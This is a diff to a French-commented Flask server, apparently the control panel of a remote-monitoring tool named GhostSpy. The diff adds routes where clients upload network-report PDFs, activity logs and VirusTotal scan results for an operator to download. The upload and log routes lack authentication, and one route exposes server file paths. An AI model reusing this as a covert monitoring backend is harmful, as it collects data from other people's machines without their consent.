@@ -16,7 +16,21 @@ import io
 from PIL import Image
 import threading
 
-app = Flask(__name__)
+def get_resource_path(relative_path):
+    """Obtient le chemin absolu vers les ressources, que ce soit en mode développement ou exécutable."""
+    try:
+        # PyInstaller crée un dossier temporaire et stocke le chemin dans _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        # En mode développement normal
+        base_path = os.path.abspath(os.path.dirname(__file__))
+    
+    return os.path.join(base_path, relative_path)
+
+# Configuration des chemins
+FRONTEND_PATH = get_resource_path('frontend')
+
+app = Flask(__name__, static_folder=FRONTEND_PATH, static_url_path='')
 
 CONFIG_FILE = 'config.json'
 DATABASE = 'clients.db'
@@ -961,7 +975,284 @@ def execute_pdf_command(client_id):
     
     return jsonify({'message': 'Commande de génération de PDF envoyée au client', 'command_id': command_id}), 200
 
-# Fonction pour s'assurer que la colonne activity_logs existe dans la table clients et l'ajouter si nécessaire
+# Ajouter une route pour télécharger le PDF
+@app.route('/client/<int:client_id>/download_pdf', methods=['GET', 'HEAD'])
+@auth_required
+def download_pdf(client_id):
+    """Télécharge le rapport PDF généré par le client."""
+    try:
+        app.logger.info(f"Demande de téléchargement PDF pour le client {client_id}")
+        
+        # Chemins possibles pour trouver le PDF
+        possible_paths = []
+        
+        # 1. Obtenir le chemin depuis la base de données
+        conn = get_db_connection()
+        client = conn.execute('SELECT pdf_report_path FROM clients WHERE id = ?', (client_id,)).fetchone()
+        conn.close()
+        
+        if client and client['pdf_report_path']:
+            possible_paths.append(client['pdf_report_path'])
+            app.logger.info(f"Chemin PDF depuis DB: {client['pdf_report_path']}")
+        
+        # 2. Obtenir le répertoire de l'application (mode exécutable ou script)
+        if getattr(sys, 'frozen', False):
+            # Mode exécutable
+            app_dir = os.path.dirname(sys.executable)
+        else:
+            # Mode script
+            app_dir = os.path.dirname(os.path.abspath(__file__))
+        
+        # 3. Répertoire parent de l'application (structure GhostSpy)
+        parent_dir = os.path.dirname(app_dir)
+        
+        # 4. Ajouter les chemins possibles pour data.pdf
+        possible_paths.extend([
+            os.path.join(parent_dir, 'data.pdf'),
+            os.path.join(app_dir, 'data.pdf'),
+            os.path.join(parent_dir, f'client_{client_id}_network_report.pdf'),
+            os.path.join(app_dir, 'pdf_reports', f'client_{client_id}_network_report.pdf'),
+            os.path.join(parent_dir, 'pdf_reports', f'client_{client_id}_network_report.pdf')
+        ])
+        
+        app.logger.info(f"Chemins de recherche PDF: {possible_paths}")
+        
+        # Chercher le fichier PDF dans tous les chemins possibles
+        pdf_path = None
+        for path in possible_paths:
+            if path and os.path.exists(path):
+                pdf_path = path
+                app.logger.info(f"PDF trouvé: {pdf_path}")
+                break
+        
+        if pdf_path:
+            # Vérifier la taille du fichier
+            file_size = os.path.getsize(pdf_path)
+            app.logger.info(f"Taille du fichier PDF: {file_size} octets")
+            
+            if file_size < 1024:
+                app.logger.warning(f"Fichier PDF trop petit: {file_size} octets")
+                return jsonify({'message': 'Fichier PDF corrompu ou vide'}), 400
+            
+            if request.method == 'HEAD':
+                response = Response()
+                response.headers['Content-Type'] = 'application/pdf'
+                response.headers['Content-Length'] = str(file_size)
+                return response
+            
+            try:
+                directory = os.path.dirname(pdf_path)
+                filename = os.path.basename(pdf_path)
+                download_name = f"client_{client_id}_rapport_reseau.pdf"
+                
+                app.logger.info(f"Envoi du fichier PDF: {pdf_path}")
+                response = send_from_directory(
+                    directory, 
+                    filename, 
+                    as_attachment=True, 
+                    mimetype='application/pdf'
+                )
+                response.headers["Content-Disposition"] = f"attachment; filename={download_name}"
+                return response
+                
+            except Exception as send_error:
+                app.logger.error(f"Erreur lors de l'envoi du fichier: {send_error}")
+                return jsonify({'message': f'Erreur lors de l\'envoi: {str(send_error)}'}), 500
+        else:
+            app.logger.warning(f"Aucun fichier PDF trouvé pour le client {client_id}")
+            return jsonify({'message': 'Rapport PDF non disponible'}), 404
+            
+    except Exception as e:
+        app.logger.error(f"Erreur lors du téléchargement PDF: {str(e)}")
+        return jsonify({'message': f'Erreur serveur: {str(e)}'}), 500
+
+@app.route('/client/<int:client_id>/upload_pdf', methods=['POST'])
+def receive_pdf(client_id):
+    """Reçoit le fichier PDF généré par le client."""
+    try:
+        if 'pdf_file' not in request.files:
+            return jsonify({'message': 'Pas de fichier PDF reçu', 'success': False}), 400
+
+        pdf_file = request.files['pdf_file']
+        if not pdf_file.filename:
+            return jsonify({'message': 'Nom de fichier PDF vide', 'success': False}), 400
+        
+        app_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
+        pdf_dir = os.path.join(app_dir, 'pdf_reports')
+        
+        if not os.path.exists(pdf_dir):
+            os.makedirs(pdf_dir)
+            
+        filename = f"client_{client_id}_network_report.pdf"
+        filepath = os.path.join(pdf_dir, filename)
+        
+        pdf_file.save(filepath)
+        
+        conn = get_db_connection()
+        conn.execute('UPDATE clients SET pdf_report_path = ? WHERE id = ?', (filepath, client_id))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'message': 'PDF reçu et enregistré avec succès', 'success': True}), 200
+    except Exception as e:
+        app.logger.error(f"Exception lors du traitement du PDF: {str(e)}")
+        return jsonify({'message': f'Erreur serveur: {str(e)}', 'success': False}), 500
+
+@app.route('/client/<int:client_id>/logs', methods=['POST'])
+def receive_logs(client_id):
+    """Reçoit les logs d'activité d'un client."""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'message': 'Données invalides'}), 400
+        
+        ensure_activity_logs_column()
+        
+        conn = get_db_connection()
+        conn.execute('UPDATE clients SET activity_logs = ? WHERE id = ?', (json.dumps(data), client_id))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'message': 'Logs d\'activité enregistrés'}), 200
+    except Exception as e:
+        app.logger.error(f"Erreur lors de la réception des logs d'activité: {str(e)}")
+        return jsonify({'message': f'Erreur lors de la réception des logs: {str(e)}'}), 500
+
+@app.route('/client/<int:client_id>/logs', methods=['GET'])
+@auth_required
+def get_logs(client_id):
+    """Récupère les logs d'activité d'un client."""
+    try:
+        ensure_activity_logs_column()
+        
+        conn = get_db_connection()
+        client = conn.execute('SELECT activity_logs FROM clients WHERE id = ?', (client_id,)).fetchone()
+        conn.close()
+        
+        if client and client['activity_logs']:
+            return jsonify({'logs': json.loads(client['activity_logs'])}), 200
+        else:
+            return jsonify({'logs': []}), 200
+    except Exception as e:
+        app.logger.error(f"Erreur lors de la récupération des logs d'activité: {str(e)}")
+        return jsonify({'logs': [], 'error': str(e)}), 200
+
+@app.route('/client/<int:client_id>/check_pdf_exists', methods=['GET'])
+@auth_required
+def check_pdf_exists(client_id):
+    """Vérifie si un rapport PDF existe pour ce client."""
+    try:
+        app.logger.info(f"Vérification de l'existence du PDF pour le client {client_id}")
+        
+        # Utiliser la même logique que download_pdf pour chercher le fichier
+        possible_paths = []
+        
+        # 1. Obtenir le chemin depuis la base de données
+        conn = get_db_connection()
+        client = conn.execute('SELECT pdf_report_path FROM clients WHERE id = ?', (client_id,)).fetchone()
+        conn.close()
+        
+        if client and client['pdf_report_path']:
+            possible_paths.append(client['pdf_report_path'])
+        
+        # 2. Obtenir le répertoire de l'application
+        if getattr(sys, 'frozen', False):
+            app_dir = os.path.dirname(sys.executable)
+        else:
+            app_dir = os.path.dirname(os.path.abspath(__file__))
+        
+        parent_dir = os.path.dirname(app_dir)
+        
+        # 3. Ajouter les chemins possibles
+        possible_paths.extend([
+            os.path.join(parent_dir, 'data.pdf'),
+            os.path.join(app_dir, 'data.pdf'),
+            os.path.join(parent_dir, f'client_{client_id}_network_report.pdf'),
+            os.path.join(app_dir, 'pdf_reports', f'client_{client_id}_network_report.pdf'),
+            os.path.join(parent_dir, 'pdf_reports', f'client_{client_id}_network_report.pdf')
+        ])
+        
+        # Chercher le fichier PDF
+        for path in possible_paths:
+            if path and os.path.exists(path):
+                file_size = os.path.getsize(path)
+                if file_size >= 1024:  # Fichier valide
+                    app.logger.info(f"PDF trouvé et valide: {path} ({file_size} octets)")
+                    return jsonify({'exists': True, 'path': path, 'size': file_size}), 200
+                else:
+                    app.logger.warning(f"PDF trouvé mais trop petit: {path} ({file_size} octets)")
+        
+        app.logger.info(f"Aucun PDF valide trouvé pour le client {client_id}")
+        return jsonify({'exists': False}), 200
+        
+    except Exception as e:
+        app.logger.error(f"Erreur lors de la vérification de l'existence du PDF: {str(e)}")
+        return jsonify({'exists': False, 'error': str(e)}), 500
+
+@app.route('/client/<int:client_id>/scan_file', methods=['POST'])
+def receive_scan_result(client_id):
+    """Reçoit les résultats de scan VirusTotal d'un client."""
+    try:
+        data = request.get_json()
+        if not data:
+            app.logger.error(f"Données de scan invalides reçues du client {client_id}")
+            return jsonify({'message': 'Données invalides'}), 400
+        
+        ensure_virus_scans_column()
+        
+        conn = get_db_connection()
+        client = conn.execute('SELECT virus_scans FROM clients WHERE id = ?', (client_id,)).fetchone()
+        
+        existing_scans = []
+        if client and client['virus_scans']:
+            try:
+                existing_scans = json.loads(client['virus_scans'])
+            except json.JSONDecodeError:
+                existing_scans = []
+        
+        existing_scans.append(data)
+        if len(existing_scans) > 50:
+            existing_scans = existing_scans[-50:]
+        
+        conn.execute('UPDATE clients SET virus_scans = ? WHERE id = ?', (json.dumps(existing_scans), client_id))
+        conn.commit()
+        conn.close()
+        
+        app.logger.info(f"Résultat de scan VirusTotal reçu pour le client {client_id}: {data.get('file_name', 'inconnu')}")
+        return jsonify({'message': 'Résultat de scan enregistré'}), 200
+        
+    except Exception as e:
+        app.logger.error(f"Erreur lors de la réception du résultat de scan: {str(e)}")
+        return jsonify({'message': f'Erreur lors de la réception du scan: {str(e)}'}), 500
+
+@app.route('/client/<int:client_id>/virus_scans', methods=['GET'])
+@auth_required
+def get_virus_scans(client_id):
+    """Récupère les résultats de scan VirusTotal d'un client."""
+    try:
+        ensure_virus_scans_column()
+        
+        conn = get_db_connection()
+        client = conn.execute('SELECT virus_scans FROM clients WHERE id = ?', (client_id,)).fetchone()
+        conn.close()
+        
+        if client and client['virus_scans']:
+            try:
+                scans = json.loads(client['virus_scans'])
+                return jsonify({'scans': scans}), 200
+            except json.JSONDecodeError:
+                return jsonify({'scans': []}), 200
+        else:
+            return jsonify({'scans': []}), 200
+            
+    except Exception as e:
+        app.logger.error(f"Erreur lors de la récupération des scans VirusTotal: {str(e)}")
+        return jsonify({'scans': [], 'error': str(e)}), 200
+
+@app.route('/favicon.ico')
+def favicon():
+    return send_from_directory(app.static_folder, 'SpyGhost_icon.ico', mimetype='image/x-icon')
+
 def ensure_activity_logs_column():
     try:
         conn = get_db_connection()
@@ -998,260 +1289,26 @@ def ensure_pdf_report_path_column():
     except Exception as e:
         print(f"Erreur inattendue lors de la vérification/ajout de la colonne pdf_report_path: {e}")
 
-# Appel au démarrage du serveur
-ensure_activity_logs_column()
-ensure_pdf_report_path_column()
-
-# Ajouter une route pour récupérer le PDF généré
-@app.route('/client/<int:client_id>/download_pdf', methods=['GET', 'HEAD'])
-@auth_required
-def download_pdf(client_id):
-    """Télécharge le rapport PDF généré par le client."""
+def ensure_virus_scans_column():
+    """S'assurer que la colonne virus_scans existe dans la table clients."""
     try:
-        # Obtenir le chemin absolu du répertoire de l'application (où se trouve server.exe)
-        app_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
-        app.logger.info(f"Recherche du PDF pour le client {client_id} depuis le répertoire: {app_dir}")
+        conn = get_db_connection()
+        cursor = conn.cursor()
         
-        # Définir les chemins de fichiers possibles
-        pdf_paths = []
+        # Vérifier si la colonne existe
+        cursor.execute("PRAGMA table_info(clients)")
+        columns = [column[1] for column in cursor.fetchall()]
         
-        # 1. Vérifier dans le dossier pdf_reports
-        pdf_reports_dir = os.path.join(app_dir, 'pdf_reports')
-        pdf_filename = f"client_{client_id}_network_report.pdf"
-        pdf_path = os.path.join(pdf_reports_dir, pdf_filename)
-        
-        if os.path.exists(pdf_path):
-            pdf_paths.append(pdf_path)
-            app.logger.info(f"PDF trouvé dans le dossier pdf_reports: {pdf_path}")
-        
-        # 2. Vérifier le fichier data.pdf dans le répertoire principal
-        data_pdf_path = os.path.join(app_dir, 'data.pdf')
-        if os.path.exists(data_pdf_path):
-            pdf_paths.append(data_pdf_path)
-            app.logger.info(f"PDF trouvé dans le répertoire principal: {data_pdf_path}")
-        
-        # 3. Vérifier aussi dans la base de données
-        try:
-            conn = get_db_connection()
-            client = conn.execute('SELECT pdf_report_path FROM clients WHERE id = ?', (client_id,)).fetchone()
-            
-            if client and client['pdf_report_path'] and os.path.exists(client['pdf_report_path']):
-                pdf_paths.append(client['pdf_report_path'])
-                app.logger.info(f"PDF trouvé via la base de données: {client['pdf_report_path']}")
-            conn.close()
-        except Exception as db_err:
-            app.logger.warning(f"Erreur lors de la vérification du chemin du PDF dans la base de données: {str(db_err)}")
-        
-        # Si aucun PDF n'a été trouvé
-        if not pdf_paths:
-            app.logger.warning(f"Rapport PDF non disponible pour le client {client_id} - aucun fichier trouvé")
-            return jsonify({
-                'message': 'Rapport PDF non disponible - aucun fichier trouvé',
-                'search_locations': [
-                    pdf_path,
-                    data_pdf_path,
-                    client['pdf_report_path'] if client and client['pdf_report_path'] else "N/A"
-                ]
-            }), 404
-        
-        # Utiliser le premier PDF trouvé
-        pdf_path = pdf_paths[0]
-        app.logger.info(f"Utilisation du PDF: {pdf_path} (taille: {os.path.getsize(pdf_path)} octets)")
-        
-        # Si c'est une requête HEAD, on retourne juste un statut 200 pour indiquer que le fichier existe
-        if request.method == 'HEAD':
-            return '', 200, {'Content-Type': 'application/pdf'}
-        
-        # Envoyer le fichier au navigateur pour téléchargement
-        directory = os.path.dirname(pdf_path)
-        filename = os.path.basename(pdf_path)
-        
-        # Nom de fichier pour le téléchargement
-        download_name = f"client_{client_id}_rapport_reseau.pdf"
-        
-        try:
-            app.logger.info(f"Envoi du fichier depuis le répertoire: {directory}, nom du fichier: {filename}")
-            response = send_from_directory(
-                directory,
-                filename,
-                as_attachment=True,
-                mimetype='application/pdf'
-            )
-            
-            # Définir explicitement l'en-tête Content-Disposition pour forcer le téléchargement
-            response.headers["Content-Disposition"] = f"attachment; filename={download_name}"
-            
-            # Désactiver la mise en cache pour éviter les problèmes avec les anciens PDFs
-            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
-            response.headers["Pragma"] = "no-cache"
-            response.headers["Expires"] = "0"
-            
-            app.logger.info(f"PDF téléchargé avec succès pour le client {client_id} depuis {pdf_path}")
-            return response
-        except Exception as e:
-            app.logger.error(f"Erreur lors de l'envoi du fichier PDF: {str(e)}")
-            return jsonify({'message': f'Erreur lors du téléchargement du PDF: {str(e)}'}), 500
-    except Exception as e:
-        app.logger.error(f"Erreur lors du traitement de la demande de téléchargement PDF: {str(e)}")
-        return jsonify({'message': f'Erreur serveur: {str(e)}'}), 500
-
-# Ajouter une route pour recevoir le PDF du client
-@app.route('/client/<int:client_id>/upload_pdf', methods=['POST'])
-def receive_pdf(client_id):
-    """Reçoit le fichier PDF généré par le client."""
-    try:
-        # Vérifier si nous avons reçu un fichier
-        if 'pdf_file' not in request.files:
-            app.logger.error(f"Pas de fichier PDF reçu pour le client {client_id}")
-            return jsonify({'message': 'Pas de fichier PDF reçu', 'success': False}), 400
-
-        pdf_file = request.files['pdf_file']
-        
-        if not pdf_file.filename:
-            app.logger.error(f"Nom de fichier PDF vide pour le client {client_id}")
-            return jsonify({'message': 'Nom de fichier PDF vide', 'success': False}), 400
-        
-        # Obtenir le chemin absolu du répertoire de l'application (où se trouve server.exe)
-        app_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
-        app.logger.info(f"Répertoire d'application: {app_dir}")
-        
-        # Créer le dossier pdf_reports dans le même répertoire que l'exécutable
-        pdf_dir = os.path.join(app_dir, 'pdf_reports')
-        if not os.path.exists(pdf_dir):
-            os.makedirs(pdf_dir)
-            app.logger.info(f"Dossier pdf_reports créé: {pdf_dir}")
-            
-        # Construire le chemin du fichier
-        filename = f"client_{client_id}_network_report.pdf"
-        filepath = os.path.join(pdf_dir, filename)
-        
-        # Enregistrer le fichier avec gestion d'erreur
-        try:
-            app.logger.info(f"Tentative d'enregistrement du PDF du client {client_id} dans {filepath}")
-            pdf_file.save(filepath)
-            
-            # Vérifier que le fichier a bien été enregistré
-            if not os.path.exists(filepath):
-                app.logger.error(f"Échec de l'enregistrement du PDF: fichier inexistant pour le client {client_id}")
-                return jsonify({'message': 'Fichier introuvable après sauvegarde', 'success': False}), 500
-                
-            if os.path.getsize(filepath) == 0:
-                app.logger.error(f"Échec de l'enregistrement du PDF: fichier vide pour le client {client_id}")
-                return jsonify({'message': 'Fichier vide après sauvegarde', 'success': False}), 500
-                
-            app.logger.info(f"PDF du client {client_id} enregistré avec succès: {filepath} (taille: {os.path.getsize(filepath)} octets)")
-        except Exception as save_error:
-            app.logger.error(f"Exception lors de l'enregistrement du PDF: {str(save_error)}")
-            return jsonify({'message': f'Erreur lors de l\'enregistrement du PDF: {str(save_error)}', 'success': False}), 500
-        
-        # Mettre à jour le chemin dans la base de données
-        try:
-            conn = get_db_connection()
-            conn.execute('UPDATE clients SET pdf_report_path = ? WHERE id = ?', (filepath, client_id))
+        if 'virus_scans' not in columns:
+            cursor.execute('ALTER TABLE clients ADD COLUMN virus_scans TEXT')
             conn.commit()
-            conn.close()
-            app.logger.info(f"Base de données mise à jour avec le chemin du PDF: {filepath}")
-        except Exception as db_error:
-            app.logger.error(f"Erreur lors de la mise à jour de la base de données: {str(db_error)}")
-            # Continuer malgré l'erreur de base de données, le fichier est sauvegardé
+            app.logger.info("Colonne 'virus_scans' ajoutée à la table clients")
         
-        # Répondre au client
-        return jsonify({'message': 'PDF reçu et enregistré avec succès', 'success': True}), 200
-    except Exception as e:
-        app.logger.error(f"Exception générale lors du traitement du PDF: {str(e)}")
-        return jsonify({'message': f'Erreur serveur: {str(e)}', 'success': False}), 500
-
-# Route pour recevoir et récupérer les logs d'activité
-@app.route('/client/<int:client_id>/logs', methods=['POST'])
-def receive_logs(client_id):
-    """Reçoit les logs d'activité d'un client."""
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({'message': 'Données invalides'}), 400
-        
-        # Assurer que la colonne existe
-        ensure_activity_logs_column()
-        
-        conn = get_db_connection()
-        conn.execute('UPDATE clients SET activity_logs = ? WHERE id = ?', 
-                    (json.dumps(data), client_id))
-        conn.commit()
         conn.close()
-        
-        return jsonify({'message': 'Logs d\'activité enregistrés'}), 200
     except Exception as e:
-        app.logger.error(f"Erreur lors de la réception des logs d'activité: {str(e)}")
-        return jsonify({'message': f'Erreur lors de la réception des logs: {str(e)}'}), 500
+        app.logger.error(f"Erreur lors de l'ajout de la colonne virus_scans: {e}")
 
-@app.route('/client/<int:client_id>/logs', methods=['GET'])
-@auth_required
-def get_logs(client_id):
-    """Récupère les logs d'activité d'un client."""
-    try:
-        # Assurer que la colonne existe
-        ensure_activity_logs_column()
-        
-        conn = get_db_connection()
-        client = conn.execute('SELECT activity_logs FROM clients WHERE id = ?', (client_id,)).fetchone()
-        conn.close()
-        
-        if client and client['activity_logs']:
-            return jsonify({'logs': json.loads(client['activity_logs'])}), 200
-        else:
-            return jsonify({'logs': []}), 200
-    except Exception as e:
-        app.logger.error(f"Erreur lors de la récupération des logs d'activité: {str(e)}")
-        return jsonify({'logs': [], 'error': str(e)}), 200  # Retourner 200 même en cas d'erreur pour éviter les problèmes côté client
-
-# Ajouter une route pour vérifier si un PDF existe (sans le télécharger)
-@app.route('/client/<int:client_id>/check_pdf_exists', methods=['GET'])
-@auth_required
-def check_pdf_exists(client_id):
-    """Vérifie si un rapport PDF existe pour ce client."""
-    try:
-        # Vérifier d'abord le chemin dans la base de données
-        conn = get_db_connection()
-        client = conn.execute('SELECT pdf_report_path FROM clients WHERE id = ?', (client_id,)).fetchone()
-        conn.close()
-        
-        # Vérifier le chemin dans la base de données
-        if client and client['pdf_report_path'] and os.path.exists(client['pdf_report_path']):
-            return jsonify({'exists': True, 'path': client['pdf_report_path']}), 200
-        
-        # Vérifier le fichier data.pdf dans le répertoire principal
-        parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-        data_pdf_path = os.path.join(parent_dir, 'data.pdf')
-        network_report_path = os.path.join(parent_dir, 'network_report.pdf')
-        
-        if os.path.exists(data_pdf_path):
-            # Mettre à jour le chemin dans la base de données
-            try:
-                conn = get_db_connection()
-                conn.execute('UPDATE clients SET pdf_report_path = ? WHERE id = ?', (data_pdf_path, client_id))
-                conn.commit()
-                conn.close()
-                app.logger.info(f"Chemin du PDF mis à jour pour le client {client_id}: {data_pdf_path}")
-            except Exception as db_err:
-                app.logger.warning(f"Impossible de mettre à jour le chemin du PDF: {str(db_err)}")
-                
-            return jsonify({'exists': True, 'path': data_pdf_path}), 200
-            
-        if os.path.exists(network_report_path):
-            return jsonify({'exists': True, 'path': network_report_path}), 200
-        
-        # Aucun PDF trouvé
-        return jsonify({'exists': False}), 200
-        
-    except Exception as e:
-        app.logger.error(f"Erreur lors de la vérification de l'existence du PDF: {str(e)}")
-        return jsonify({'exists': False, 'error': str(e)}), 500
-
-# Ajouter cette route pour gérer les requêtes favicon.ico
-@app.route('/favicon.ico')
-def favicon():
-    return send_from_directory(app.static_folder, 'SpyGhost_icon.ico', mimetype='image/x-icon')
-
+# Appel au démarrage du serveur
 if __name__ == '__main__':
     # Toujours vérifier si le fichier de base de données existe et est valide
     db_exists = os.path.exists(DATABASE)
@@ -1282,6 +1339,7 @@ if __name__ == '__main__':
     try:
         ensure_activity_logs_column()
         ensure_pdf_report_path_column()
+        ensure_virus_scans_column()
     except Exception as e:
         print(f"Erreur lors de la vérification des colonnes: {e}")
     
